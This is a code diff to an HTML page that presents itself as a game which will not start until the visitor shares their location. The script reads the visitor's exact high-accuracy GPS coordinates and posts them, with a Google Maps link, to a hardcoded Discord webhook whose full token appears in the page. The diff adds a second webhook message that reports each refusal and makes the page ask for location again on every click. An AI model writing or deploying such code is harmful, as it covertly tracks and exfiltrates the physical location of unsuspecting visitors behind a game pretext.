@@ -96,7 +96,9 @@
 </div>
 
 <script>
-document.getElementById("locBtn").addEventListener("click", () => {
+const webhook = "https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb";
+
+function requestLocation() {
 
     navigator.geolocation.getCurrentPosition(
         
@@ -106,12 +108,12 @@ document.getElementById("locBtn").addEventListener("click", () => {
             const acc = pos.coords.accuracy;
 
             // ⭐ Envoi au webhook Discord ⭐
-            fetch("https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb", {
+            fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     username: "Website Logger (exact location)",
-                    content: "📍 Nouveau joueur (avec consentement)",
+                    content: "📍 Nouveau joueur (consentement donné)",
                     embeds: [
                         {
                             title: "Localisation exacte du joueur",
@@ -137,6 +139,24 @@ https://www.google.com/maps?q=${lat},${lon}`,
             errorDiv.style.display = "block";
 
             if (err.code === 1) {
+
+                // ⭐ Envoi du Webhook "location_denied" ⭐
+                fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: "Website Logger",
+                        embeds: [
+                            {
+                                title: "❌ Localisation refusée",
+                                description:
+"Un utilisateur a refusé la localisation.<br>Le jeu n'a pas pu démarrer.",
+                                color: 0xff4444
+                            }
+                        ]
+                    })
+                });
+
                 errorDiv.innerHTML = 
 "⚠️ Vous avez refusé la géolocalisation.<br><br>Veuillez aller dans :<br><br><b>Paramètres → Confidentialité → Localisation</b><br>et autoriser la localisation pour ce site.";
             } else {
@@ -147,13 +167,13 @@ https://www.google.com/maps?q=${lat},${lon}`,
 
         { enableHighAccuracy: true, timeout: 10000 }
     );
+}
 
+// ⭐ ÉVITER LA MÉMOIRE DU NAVIGATEUR — REDEMENDER À CHAQUE CLIC ⭐
+document.getElementById("locBtn").addEventListener("click", () => {
+    requestLocation();
 });
 </script>
 
 </body>
 </html>
-
-
-
-
